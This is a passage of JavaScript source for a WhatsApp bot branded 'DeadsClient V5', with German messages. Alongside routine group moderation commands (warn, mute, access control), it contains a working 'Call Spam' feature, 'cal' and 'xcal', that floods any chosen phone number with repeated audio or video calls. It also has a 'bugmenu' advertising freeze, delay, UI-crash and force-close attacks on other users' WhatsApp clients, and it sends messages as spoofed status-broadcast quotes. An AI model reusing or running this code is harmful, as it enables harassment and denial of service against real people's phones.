  let sender;
  if (msg.key.fromMe) {
    sender = (msg.key.participant || msg.key.remoteJid || "").split(":")[0];
  } else if (isGroupChat && msg.key.participant) {
    sender = msg.key.participant.split('@')[0];
  } else {
    sender = chatId.split('@')[0];
  }
  const cleanedSender = sender.replace(/[^0-9]/g, '');
  if (!isBot) return reply('> 🩸𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭🩸\n⛔ Du hast keinen Zugriff auf diesen Befehl.');
  let targetNumber;
  if (isGroupChat && msg.message.extendedTextMessage && msg.message.extendedTextMessage.contextInfo && msg.message.extendedTextMessage.contextInfo.mentionedJid && msg.message.extendedTextMessage.contextInfo.mentionedJid.length > 0) {
    const mentionedJid = msg.message.extendedTextMessage.contextInfo.mentionedJid[0];
    targetNumber = mentionedJid.split('@')[0].replace(/[^0-9]/g, '');
  } else {
    targetNumber = cleanedSender;
  }
  if (access.addAccess(targetNumber)) {
    reply(`> 🩸𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭🩸\n✅ Zugriff für Nummer +${targetNumber} erfolgreich hinzugefügt.`);
  } else {
    reply(`ℹ️ Nummer +${targetNumber} hatte bereits Zugriff.`);
  }
  break;
}


case 'removeaccess': {
  let sender;
  if (msg.key.fromMe) {
    sender = (msg.key.participant || msg.key.remoteJid || "").split(":")[0];
  } else if (isGroupChat && msg.key.participant) {
    sender = msg.key.participant.split('@')[0];
  } else {
    sender = chatId.split('@')[0];
  }
  const cleanedSender = sender.replace(/[^0-9]/g, '');
   if (!isBot) return reply('> 🩸𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭🩸\n⛔ Du hast keinen Zugriff auf diesen Befehl.');
  let targetNumber;
  if (isGroupChat && msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.length > 0) {
    targetNumber = msg.message.extendedTextMessage.contextInfo.mentionedJid[0].split('@')[0].replace(/[^0-9]/g, '');
  } else {
    targetNumber = cleanedSender;
  }
  if (access.removeAccess(targetNumber)) {
    reply(`> 🩸𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭🩸\n✅ Zugriff für Nummer +${targetNumber} erfolgreich entfernt.`);
  } else {
    reply(`> 🩸𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭🩸\nℹ️ Nummer +${targetNumber} hatte keinen Zugriff.`);
  }
  break;
}


case 'checkaccess': {
  let sender;
  if (msg.key.fromMe) {
    sender = (msg.key.participant || msg.key.remoteJid || "").split(":")[0];
  } else if (isGroupChat && msg.key.participant) {
    sender = msg.key.participant.split('@')[0];
  } else {
    sender = chatId.split('@')[0];
  }
  const cleanedSender = sender.replace(/[^0-9]/g, '');

  let targetNumber;
  if (isGroupChat && msg.message.extendedTextMessage?.contextInfo?.mentionedJid?.length > 0) {
    targetNumber = msg.message.extendedTextMessage.contextInfo.mentionedJid[0].split('@')[0].replace(/[^0-9]/g, '');
  } else {
    targetNumber = cleanedSender;
  }

  if (access.isAllowed(targetNumber)) {
    reply(`> 🩸𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭🩸\n✅ Nummer +${targetNumber} hat Zugriff.`);
  } else {
    reply(`> 🩸𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭🩸\n⛔ Nummer +${targetNumber} hat keinen Zugriff.`);
  }
  break;
}


case 'antideletepn': {
  const targetJid = msg.key.remoteJid;

  const option = q.trim().toLowerCase();
  if (option !== 'on' && option !== 'off') {
    await sendStyledMessage(from, '⚙️ Benutzung:\n`.antidelete on` oder `.antidelete off`');
    return;
  }

  antiDeleteConfig[targetJid] = option === 'on';
  saveAntiDeleteConfig();

  await sendStyledMessage(from, `🛡️ Anti-Delete wurde *${option === 'on' ? 'aktiviert' : 'deaktiviert'}* für diesen Chat.`);
  break;
}


case 'album': {
const cleanedSender = sender.replace(/[^0-9]/g, '');
if (!access.isAllowed(cleanedSender)) {
  return reply('⛔ Du hast keinen Zugriff auf diesen Befehl.');
}
sock.sendAlbumMessage(from, [
    {
        image: { url: "./dev/dead2.jpg" },
        caption: "> 🩸𝐖𝐢𝐥𝐥𝐤𝐨𝐦𝐦𝐞𝐧 𝐛𝐞𝐢 𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5 – 𝐃𝐚𝐬 𝐢𝐬𝐭 𝐝𝐞𝐢𝐧 𝐞𝐱𝐤𝐥𝐮𝐬𝐢𝐯𝐞𝐬 𝐀𝐥𝐛𝐮𝐦",
        mimetype: "image/jpeg"
    },
    "./dev/dead.jpg",
    "./dev/dead1.jpg",
    "./dev/dead3.jpg",
    "./dev/dead4.jpg",
], {
    quotedMessage: {
        stickerPackMessage: {
            name: "○◦━©𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5━◦○"
        }
    },
    stanzaId: false,
    remoteJid: "status@broadcast",
    participant: "13135550002@s.whatsapp.net"
})
}
break;
//==========================Allgemeine Funktionen=======================//

//==========================Gruppen Funktionen=======================//
case 'warn': {
  if (!isGroup) return sendStyledMessage(from, '⚠️ Dieser Befehl geht nur in Gruppen.');
  if (!(await isUserAdmin(from, sender))) return sendStyledMessage(from, '🚫 Nur Admins dürfen verwarnen.');

  const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
  if (!mentioned) return sendStyledMessage(from, '👤 Markiere die Person, die du verwarnen willst.');

  const userId = mentioned.split('@')[0];
  const warns = addWarning(from, userId);

  if (warns >= 3) {
    await sendStyledMessage(from, `❌ @${userId} wurde 3x verwarnt und wird entfernt.`, { mentions: [mentioned] });
    await sock.groupParticipantsUpdate(from, [mentioned], 'remove');
    resetWarnings(from, userId);
  } else {
    await sendStyledMessage(from, `⚠️ @${userId} hat jetzt ${warns}/3 Verwarnungen.`, { mentions: [mentioned] });
  }

  break;
}

case 'resetwarn': {
  if (!isGroup) return sendStyledMessage(from, '⚠️ Nur in Gruppen verfügbar.');
  if (!(await isUserAdmin(from, sender))) return sendStyledMessage(from, '🚫 Keine Admin-Rechte.');

  const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
  if (!mentioned) return sendStyledMessage(from, '👤 Markiere die Person.');

  const userId = mentioned.split('@')[0];
  resetWarnings(from, userId);
  await sendStyledMessage(from, `✅ Verwarnungen für @${userId} wurden zurückgesetzt.`, { mentions: [mentioned] });

  break;
}

case 'warns': {
  if (!isGroup) return sendStyledMessage(from, '⚠️ Dieser Befehl geht nur in Gruppen.');

  const groupWarns = warnedUsers[from];
  if (!groupWarns || Object.keys(groupWarns).length === 0) {
    return sendStyledMessage(from, '✅ In dieser Gruppe hat aktuell niemand Verwarnungen.');
  }

  let text = `📄 *Verwarnungsliste (${Object.keys(groupWarns).length})*\n\n`;
  for (const [userId, count] of Object.entries(groupWarns)) {
    text += `• @${userId} – ${count}/3 Verwarnungen\n`;
  }

  await sendStyledMessage(from, text, {
    mentions: Object.keys(groupWarns).map(u => u + '@s.whatsapp.net'),
  });

  break;
}

case 'reactions':
  const keys = Object.keys(reactionTriggers);
  const listText = `🤖 *Reaktions-Trigger*\n\nDu kannst z.B. schreiben:\n\n${keys.map(k => `• ${k}`).join('\n')}\n\nDer Bot reagiert automatisch mit einem passenden GIF!`;
  await sendStyledMessage(from, listText);
  break;
  
case 'unmute': {
  const groupId = msg.key.remoteJid;
  const sender = msg.key.participant || msg.key.remoteJid;
  const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];

  if (!mentioned) return sendStyledMessage(groupId, '❌ Bitte erwähne einen Nutzer.');

  if (!(await isUserAdmin(groupId, sender))) {
    return sendStyledMessage(groupId, '❌ Nur Admins können Nutzer entmuten.');
  }

  if (mutedUsers[groupId]?.includes(mentioned)) {
    mutedUsers[groupId] = mutedUsers[groupId].filter(u => u !== mentioned);
    saveMuted();
    await sendStyledMessage(groupId, `✅ <@${mentioned.split('@')[0]}> wurde entmutet.`, { mentions: [mentioned] });
  } else {
    await sendStyledMessage(groupId, '⚠️ Nutzer ist nicht gemutet.');
  }
  break;
}


case 'mute': {
  const groupId = msg.key.remoteJid;
  const sender = msg.key.participant || msg.key.remoteJid;
  const mentioned = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0];

  if (!mentioned) return sendStyledMessage(groupId, '❌ Bitte erwähne einen Nutzer.');

  if (!(await isUserAdmin(groupId, sender))) {
    return sendStyledMessage(groupId, '❌ Nur Admins können Nutzer muten.');
  }

  mutedUsers[groupId] = mutedUsers[groupId] || [];
  if (!mutedUsers[groupId].includes(mentioned)) {
    mutedUsers[groupId].push(mentioned);
    saveMuted();
    await sendStyledMessage(groupId, `🔇 <@${mentioned.split('@')[0]}> wurde stummgeschaltet.`, { mentions: [mentioned] });
  } else {
    await sendStyledMessage(groupId, '⚠️ Nutzer ist bereits gemutet.');
  }
  break;
}

case 'mutedlist': {
  const groupId = msg.key.remoteJid;
  const muted = mutedUsers[groupId] || [];

  if (muted.length === 0) {
    return sendStyledMessage(groupId, '📭 Niemand ist aktuell stummgeschaltet.');
  }

  const listText = muted.map((u, i) => `${i + 1}. @${u.split('@')[0]}`).join('\n');
  await sendStyledMessage(groupId, `🔇 *Gemutete Nutzer:*\n\n${listText}`, { mentions: muted });
  break;
}  

case 'antidelete': {
  const groupId = msg.key.remoteJid;

  if (!isGroup) {
    await sendStyledMessage(from, '❌ Dieser Befehl funktioniert nur in Gruppen.');
    return;
  }

  const sender = msg.key.participant || msg.key.remoteJid;
  if (!(await isUserAdmin(from, sender))) {
    await sendStyledMessage(from, '❌ Nur Gruppenadmins können Anti-Delete ein- oder ausschalten.');
    return;
  }

  const option = q.trim().toLowerCase();
  if (option !== 'on' && option !== 'off') {
    await sendStyledMessage(from, '⚙️ Benutzung:\n`.antidelete on` oder `.antidelete off`');
    return;
  }

  antiDeleteConfig[groupId] = option === 'on';
  saveAntiDeleteConfig();

  await sendStyledMessage(from, `🛡️ Anti-Delete wurde *${option === 'on' ? 'aktiviert' : 'deaktiviert'}*.`);
  break;
}
//==========================Gruppen Funktionen=======================//

//==========================Call Spam=======================//
 case 'cal': {
if (!isBot) return; 
    try {
        const count = parseInt(args[0]);
        const isVideo = args[1] === 'true';

        if (isNaN(count) || count <= 0) {
            await sock.sendMessage(from, {
                text: "Bitte gib eine gültige Anzahl an Anrufen ein (z. B. `cal 5 true` für 5 Videoanrufe)."
            });
            break;
        }

        for (let i = 0; i < count; i++) {
            await sock.sendOfferCall(from, isVideo);
        }

    } catch (error) {
        console.error("Fehler beim Ausführen des 'cal'-Befehls:", error);
        await sock.sendMessage(from, {
            text: "Es ist ein Fehler aufgetreten beim Versuch, Anrufe zu senden."
        });
    }
    break;
}

case 'xcal': {
  if (!isBot) return;

  try {
    if (args.length < 1) {
      await sock.sendMessage(from, {
        text: "Beispiel: .cal +49 174 123456, 10, true"
      });
      break;
    }
    const input = args.join(' ');
    const [rawNumber, rawCount, rawVideo] = input.split(',').map(s => s.trim());
    if (!rawNumber || !rawCount) {
      await sock.sendMessage(from, { text: "> ©︻デ═一𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5🌹⟆𑇇᷍᷍᷍𑇇𑁍\n> Bitte gib Nummer und Anzahl an, z.B. .cal +49 174 123456, 10, true" });
      break;
    }
    const cleanedNumber = rawNumber.replace(/[^\d]/g, '');
    const targetJid = cleanedNumber + '@s.whatsapp.net';
    const count = parseInt(rawCount);
    if (isNaN(count) || count <= 0) {
      await sock.sendMessage(from, { text: "> ©︻デ═一𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5🌹⟆𑇇᷍᷍᷍𑇇𑁍\n> Bitte gib eine gültige Anzahl an Anrufen an." });
      break;
    }

    const isVideo = rawVideo === 'true';

    for (let i = 0; i < count; i++) {
      await sock.sendOfferCall(targetJid, isVideo);
      await new Promise(res => setTimeout(res, 1000)); // 1 Sekunde Pause zwischen den Anrufen
    }

    await sock.sendMessage(from, {
    text: `> ©︻デ═一𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭𝐯4🌹⟆𑇇᷍᷍᷍𑇇𑁍\n> ✅ Successfully sent ${count} ${isVideo ? 'Video' : 'Audio'} call${count > 1 ? 's' : ''} to ${rawNumber} ⭐️`
    });

  } catch (error) {
    console.error("Fehler beim 'cal'-Befehl:", error);
    await sock.sendMessage(from, {
      text: "Fehler beim Senden der Anrufe."
    });
  }
  break;
}

//==========================Call Spam=======================//

//==========================Menus=======================//
case 'menu': {
  let sender;
  if (msg.key.fromMe) {
    // Wenn die Nachricht vom Bot selbst gesendet wurde, nutze die Bot-Nummer
    sender = sock.user.id.split(':')[0];
  } else if (isGroupChat && msg.key.participant) {
    sender = msg.key.participant.split('@')[0];
  } else {
    sender = chatId.split('@')[0];
  }
  const cleanedSender = sender.replace(/[^0-9]/g, '');
  
  if (!access.isAllowed(cleanedSender)) {
    return reply('⛔ Du hast keinen Zugriff auf diesen Befehl.');
  }

  const videos = ['deadv.mp4', 'deadv1.mp4'];
  const baseVideoPath = './dev/';
  const randomVideo = videos[Math.floor(Math.random() * videos.length)];
  const videoPath = `${baseVideoPath}${randomVideo}`;

  const statusQuoted = {
    key: {
      fromMe: false,
      participant: '0@s.whatsapp.net',
      remoteJid: 'status@broadcast',
      id: crypto.randomUUID()
    },
    message: {
      extendedTextMessage: {
        text: '©⸸꙰ी𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5ि꙰⸸'
      }
    }
  };

  try {
    const from = msg.key.remoteJid;
    if (!from) return;

    const now = new Date();
    const currentDate = `${now.getDate().toString().padStart(2, "0")}.${(now.getMonth() + 1).toString().padStart(2, "0")}.${now.getFullYear()}`;
    const currentTime = `${now.getHours().toString().padStart(2, "0")}:${now.getMinutes().toString().padStart(2, "0")}`;

    const mediaVideo = (
      await prepareWAMessageMedia(
        { video: fs.readFileSync(videoPath) },
        { upload: sock.waUploadToServer }
      )
    ).videoMessage;

    const crashMenuSections = [
      {
        title: '©𝕸𝖊𝖓𝖚',
        rows: [
          { title: '┏─══─━══─|𝕸𝖊𝖓𝖚|─══━─══─┓', description: '', id: '' },
          { title: '', description: '©Ping Bot', id: '.ping' },
          { title: '', description: '©Owner Info', id: '.owner' },
          { title: '', description: '©Bugmenu', id: '.bugmenu' },
          { title: '', description: '©TikTok DownloadMenu', id: '.tmenu' },
          { title: '', description: '©GroupMenu', id: '.grpmenu' },
          { title: '', description: '©AntiLink in Groups on/off', id: '.antilink' },
          { title: '', description: '©StatusMention Delay', id: '.blackdelay' },
          { title: '', description: '©CallMenu', id: '.callmenu' },
          { title: '', description: '©AntiDeletePnChat on', id: '.antideletepn on' },
          { title: '', description: '©AntiDeletePnChat off', id: '.antideletepn off' },
          { title: '', description: '©AntiLinkGrpChat on', id: '.antilink on' },
          { title: '', description: '©AntiLinkGrpChat off', id: '.antilink off' },
          { title: '', description: '©AntiLinkByPass with @user on/off', id: '.antilinkbypass' },
          { title: '┗─══─━══─|𝕸𝖊𝖓𝖚|─══━─══─┛', description: '', id: '' }
        ]
      }
    ];

    const linkSections = [
      {
        title: '©𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭🩸𝐜𝐡𝐚𝐧𝐧𝐞𝐥',
        rows: [
          {
            title: '   ',
            description: 'https://whatsapp.com/channel/0029VbAkmG81NCrQCKZr203P',
            id: 'mmm'
          }
        ]
      }
    ];

    const caption = `╭━─⸸🩸꙰ी𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5ि🩸꙰⸸─━╮

⭐️ ${currentDate}
⭐️ ${currentTime} Uhr
╰━─━─🩸𝐌𝐚𝐢𝐧𝐌𝐞𝐧𝐮🩸─━─━╯`;

    await sock.sendjsonv3(from, {
      viewOnceMessage: {
        message: {
          buttonsMessage: {
            contentText: caption,
            footerText: '©𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭',
            videoMessage: mediaVideo,
            buttons: [
              {
                buttonId: 'open_menu',
                buttonText: { displayText: '📑Menu open' },
                nativeFlowInfo: {
                  name: 'single_select',
                  paramsJson: JSON.stringify({ title: '  ', sections: crashMenuSections })
                },
                type: 'RESPONSE'
              },
              {
                buttonId: 'open_channel',
                buttonText: { displayText: '📢 DeadsClient Channel' },
                nativeFlowInfo: {
                  name: 'single_select',
                  paramsJson: JSON.stringify({ title: '©𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭', sections: linkSections })
                },
                type: 'RESPONSE'
              }
            ],
            headerType: 5,
            header: 'videoMessage',
            contextInfo: {
              externalAdReply: {
                title: `⭐️©𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭⭐️`,
                body: '©⸸🩸꙰ी𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5ि🩸꙰⸸',
                mediaType: 1,
                thumbnailUrl: 'https://i.postimg.cc/1zPb280Y/IMG-20250611-WA0004.jpg',
                mediaUrl: 'https://whatsapp.com/channel/0029VbAkmG81NCrQCKZr203P',
                renderLargerThumbnail: true
              }
            }
          }
        }
      }
    }, { quoted: statusQuoted });

  } catch (err) {
    console.error('[Fehler in case menu]:', err);
  }
  break;
}

case 'grpmenu': {
  let sender;
  if (msg.key.fromMe) {
    // Wenn die Nachricht vom Bot selbst gesendet wurde, nutze die Bot-Nummer
    sender = sock.user.id.split(':')[0];
  } else if (isGroupChat && msg.key.participant) {
    sender = msg.key.participant.split('@')[0];
  } else {
    sender = chatId.split('@')[0];
  }
  const cleanedSender = sender.replace(/[^0-9]/g, '');
  
  if (!access.isAllowed(cleanedSender)) {
    return reply('⛔ Du hast keinen Zugriff auf diesen Befehl.');
  }
  try {
    const from = msg.key.remoteJid;

    const now = new Date();
    const hours = now.getHours().toString().padStart(2, "0");
    const minutes = now.getMinutes().toString().padStart(2, "0");
    const day = now.getDate().toString().padStart(2, "0");
    const month = (now.getMonth() + 1).toString().padStart(2, "0");
    const year = now.getFullYear();

    const currentTime = `${hours}:${minutes}`;
    const currentDate = `${day}.${month}.${year}`;

    const caption = `┏─══─━═𝐆𝐫𝐨𝐮𝐩𝐌𝐞𝐧𝐮═━─══─┓
       ⭐️  ${currentDate}
       ⭐️  ${currentTime} Uhr🕰
     ©⸸🩸꙰ी𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5ि🩸꙰⸸    
      ⭐️ 𝐖𝐞𝐥𝐜𝐨𝐦𝐞
      ⭐️ 𝐅𝐚𝐫𝐞𝐰𝐞𝐥𝐥
      ⭐️ 𝐓𝐚𝐠𝐚𝐥𝐥&𝐇𝐢𝐝𝐞𝐭𝐚𝐠𝐚𝐥𝐥
      ⭐️ 𝐆𝐫𝐩𝐢𝐧𝐟𝐨
      ⭐️ 𝐀𝐝𝐝&𝐊𝐢𝐜𝐤 𝐮𝐬𝐞𝐫 𝐩𝐞𝐫 @
      ⭐️ 𝐌𝐮𝐭𝐞&𝐔𝐧𝐦𝐮𝐭𝐞
      ⭐️ 𝐆𝐫𝐨𝐮𝐩𝐥𝐢𝐧𝐤&𝐑𝐞𝐯𝐨𝐤𝐞
      ⭐️ 𝐃𝐞𝐥𝐞𝐭𝐞 𝐌𝐞𝐬𝐬𝐚𝐠𝐞
      ⭐️ 𝐒𝐞𝐭𝐧𝐚𝐦𝐞&𝐒𝐞𝐭𝐝𝐞𝐬𝐜
┗─══─━═𝐆𝐫𝐨𝐮𝐩𝐌𝐞𝐧𝐮═━─══─┛`;
  
    const jpegThumbnail = fs.readFileSync('./dev/deadmenu.jpg');

    const statusQuoted = {
      key: {
        fromMe: false,
        participant: '0@s.whatsapp.net',
        remoteJid: 'status@broadcast',
        id: crypto.randomUUID()
      },
      message: {
        extendedTextMessage: {
          text: '✠︻デ═一▸𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭'
        }
      }
    };

    const messagePayload = {
      ephemeralMessage: {
        message: {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
                messageSecret: crypto.randomBytes(32),
              },
              buttonsMessage: {
                contentText: caption,
                footerText: '© 𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭',
                locationMessage: {
                  degreesLatitude: 25.2048,
                  degreesLongitude: 55.2708,
                  name: "DeadsClient HQ",
                  address: "Dubai",
                  jpegThumbnail 
                },
                buttons: [
                  {
                    buttonId: 'open_list_1',
                    buttonText: { displayText: '⭐️𝐆𝐫𝐨𝐮𝐩' },
                    type: 4,
                    nativeFlowInfo: {
                      name: 'single_select',
                      paramsJson: JSON.stringify({
                        title: "©𝐆𝐫𝐨𝐮𝐩𝐌𝐞𝐧𝐮",
                        sections: [
                          {
                            title: "©𝐆𝐫𝐨𝐮𝐩 𝐅𝐮𝐧𝐜𝐭𝐢𝐨𝐧𝐬",
                            rows: [
                                  { title: '┏─══─━══─|⭐️𝐆𝐫𝐨𝐮𝐩𝐌𝐞𝐧𝐮⭐️|─══━─══─┓', description: '', id: '' },
          { title: '', description: '🌹𝐖𝐞𝐥𝐜𝐨𝐦𝐞🌹', id: '.welcome' },
          { title: '', description: '🌹𝐅𝐚𝐫𝐞𝐰𝐞𝐥𝐥🌹', id: '.farewell' },
          { title: '', description: '🌹𝐓𝐚𝐠𝐚𝐥𝐥🌹', id: '.tagall' },
          { title: '', description: '🌹𝐇𝐢𝐝𝐞𝐭𝐚𝐠𝐚𝐥𝐥🌹', id: '.hidetagall' },
          { title: '', description: '🌹𝐆𝐫𝐩𝐢𝐧𝐟𝐨🌹', id: '.grpinfo' },
          { title: '', description: '🌹𝐀𝐝𝐝 𝐮𝐬𝐞𝐫🌹', id: '.add' },
          { title: '', description: '🌹𝐀𝐝𝐝&𝐊𝐢𝐜𝐤 𝐮𝐬𝐞𝐫 𝐩𝐞𝐫 @🌹', id: '.kick' },
          { title: '', description: '🌹𝐌𝐮𝐭𝐞🌹', id: '.mute' },
          { title: '', description: '🌹𝐔𝐧𝐦𝐮𝐭𝐞🌹', id: '.unmute' },
          { title: '', description: '🌹𝐆𝐫𝐨𝐮𝐩𝐥𝐢𝐧𝐤🌹', id: '.grouplink' },
          { title: '', description: '🌹𝐑𝐞𝐯𝐨𝐤𝐞 𝐆𝐫𝐨𝐮𝐩𝐥𝐢𝐧𝐤🌹', id: '.revoke' },
          { title: '', description: '🌹𝐃𝐞𝐥𝐞𝐭𝐞 𝐌𝐞𝐬𝐬𝐚𝐠𝐞🌹', id: '.del' },
          { title: '', description: '🌹𝐒𝐞𝐭𝐧𝐚𝐦𝐞🌹', id: '.setname ✠︻デ═一▸𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭' },
          { title: '', description: '🌹𝐒𝐞𝐭𝐝𝐞𝐬𝐜🌹', id: '.setdesc ✠︻デ═一▸𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭' },
          { title: '┗─══─━══─|⭐️𝐆𝐫𝐨𝐮𝐩𝐌𝐞𝐧𝐮⭐️|─══━─══─┛', description: '', id: '.ping' }
                            ]
                          }
                        ]
                      })
                    },
                    type: 'RESPONSE'
                  },
                  {
                    buttonId: 'open_list_2',
                    buttonText: { displayText: '𝐌𝐞𝐧𝐮⭐️' },
                    type: 4,
                    nativeFlowInfo: {
                      name: 'single_select',
                      paramsJson: JSON.stringify({
                        title: "Menu©",
                        sections: [
                          {
                            title: "©𝐁𝐨𝐭 𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮",
                            rows: [
                                 { title: '┏─══─━══─|𝕸𝖊𝖓𝖚|─══━─══─┓', description: '', id: '' },
                              { title: '', description: '©Ping Bot', id: '.ping' },
                              { title: '', description: '©Owner Info', id: '.owner' },
                              { title: '', description: '©Bugmenu', id: '.bugmenu' },
                              { title: '', description: '©GroupMenu', id: '.grpmenu' },
                              { title: '', description: '©AntiLink in Groups on/off', id: '.antilink' },
                              { title: '', description: '©StatusMemtion Delay', id: '.blackdelay' },
                              { title: '', description: '©CallMenu', id: '.callmenu' },
                              { title: '', description: '©AntiDeletePnChat on', id: '.antideletepn on' },
                              { title: '', description: '©AntiDeletePnChat off', id: '.antideletepn off' },
                              { title: '', description: '©AntiLinkGrpChat on', id: '.antilink on' },
                              { title: '', description: '©AntiLinkGrpChat off', id: '.antilink off' },
                              { title: '', description: '©AntiLinkByPass with @user on/off', id: '.antilinkbypass' },
                                { title: '┗─══─━══─|𝕸𝖊𝖓𝖚|─══━─══─┛', description: '', id: '' }
                            ]
                          }
                        ]
                      })
                    },
                    type: 'RESPONSE'
                  }
                ],
                headerType: 6 
              }
            }
          }
        }
      }
    };
    await sock.sendjsonv3(from, messagePayload, { quoted: statusQuoted });

  } catch (err) {
    console.error('[❌ Fehler in Case bun]', err);
  }

  break;
}


case 'bugmenu': {
  let sender;
  if (msg.key.fromMe) {
    // Wenn die Nachricht vom Bot selbst gesendet wurde, nutze die Bot-Nummer
    sender = sock.user.id.split(':')[0];
  } else if (isGroupChat && msg.key.participant) {
    sender = msg.key.participant.split('@')[0];
  } else {
    sender = chatId.split('@')[0];
  }
  const cleanedSender = sender.replace(/[^0-9]/g, '');
  
  if (!access.isAllowed(cleanedSender)) {
    return reply('⛔ Du hast keinen Zugriff auf diesen Befehl.');
  }
  const videos = ['deadv.mp4', 'deadv1.mp4'];
  const baseVideoPath = './dev/';
  const randomVideo = videos[Math.floor(Math.random() * videos.length)];
  const videoPath = `${baseVideoPath}${randomVideo}`;

  const statusQuoted = {
    key: {
      fromMe: false,
      participant: '0@s.whatsapp.net',
      remoteJid: 'status@broadcast',
      id: crypto.randomUUID()
    },
    message: {
      extendedTextMessage: {
        text: '©⸸🩸꙰ी𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5ि🩸꙰⸸'
      }
    }
  };

  try {
    const from = msg.key.remoteJid;
    if (!from) return;

    const now = new Date();
    const currentDate = `${now.getDate().toString().padStart(2, "0")}.${(now.getMonth() + 1).toString().padStart(2, "0")}.${now.getFullYear()}`;
    const currentTime = `${now.getHours().toString().padStart(2, "0")}:${now.getMinutes().toString().padStart(2, "0")}`;

    const mediaVideo = (
      await prepareWAMessageMedia(
        { video: fs.readFileSync(videoPath) },
        { upload: sock.waUploadToServer }
      )
    ).videoMessage;
    const crashMenuSections = [
      {
        title: '©𝕸𝖊𝖓𝖚',
        rows: [
          { title: '┏─══─━══─|𝕸𝖊𝖓𝖚|─══━─══─┓', description: '', id: '' },
                              { title: '', description: '©Freeze', id: '.freeze' },
                              { title: '', description: '©GroupFreeze', id: '.grpfreeze' },
                              { title: '', description: '©Delay', id: '.delay' },
                              { title: '', description: '©StatusMention Delay', id: '.blackdelay' },
                              { title: '', description: '©OrderUiCrash', id: '.orderui 3 5' },
                              { title: '', description: '©ForceClose Perma? (only andro)', id: '.forceclose' },
                              
                                { title: '┗─══─━══─|𝕸𝖊𝖓𝖚|─══━─══─┛', description: '', id: '' }
        ]
      }
    ];
    const linkSections = [
      {
        title: '©𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭🩸𝐜𝐡𝐚𝐧𝐧𝐞𝐥',
        rows: [
          {
            title: '   ',
            description: 'https://whatsapp.com/channel/0029VbAkmG81NCrQCKZr203P',
            id: 'mmm' 
          }
        ]
      }
    ];

    const caption = `┏─═𝕸𝖊𝖓𝖚═─┓

⭐️ ${currentDate}
⭐️ ${currentTime} Uhr`;

    await sock.sendjsonv3(from, {
      viewOnceMessage: {
        message: {
          buttonsMessage: {
            contentText: caption,
            footerText: '©𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭',
            videoMessage: mediaVideo,
            buttons: [
              {
                buttonId: 'open_menu',
                buttonText: { displayText: '📑Menu open' },
                nativeFlowInfo: {
                  name: 'single_select',
                  paramsJson: JSON.stringify({ title: '  ', sections: crashMenuSections })
                },
                type: 'RESPONSE'
              },
              {
                buttonId: 'open_channel',
                buttonText: { displayText: '📢 DeadsClient Channel' },
                nativeFlowInfo: {
                  name: 'single_select',
                  paramsJson: JSON.stringify({ title: '©𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭', sections: linkSections })
                },
                type: 'RESPONSE'
              }
            ],
            headerType: 5,
            header: 'videoMessage',
            contextInfo: {
              externalAdReply: {
              
                title: `⭐️©𝐃𝐞𝐚𝐝𝐬𝐂𝐥𝐢𝐞𝐧𝐭⭐️`,
                body: '©⸸🩸꙰ी𝑫𝒆𝒂𝒅𝒔𝑪𝒍𝒊𝒆𝒏𝒕𝑽5ि🩸꙰⸸',
                mediaType: 1,
                thumbnailUrl: 'https://i.postimg.cc/1zPb280Y/IMG-20250611-WA0004.jpg',
                mediaUrl: 'https://whatsapp.com/channel/0029VbAkmG81NCrQCKZr203P',
                renderLargerThumbnail: true
              }
            }
          }
        }
      }
    }, { quoted: statusQuoted });

  } catch (err) {
    console.error('[Fehler in case menu]:', err);
  }
  break;
}

case 'callmenu': {
  let sender;
  if (msg.key.fromMe) {
    // Wenn die Nachricht vom Bot selbst gesendet wurde, nutze die Bot-Nummer
    sender = sock.user.id.split(':')[0];
  } else if (isGroupChat && msg.key.participant) {
    sender = msg.key.participant.split('@')[0];
  } else {
    sender = chatId.split('@')[0];
  }
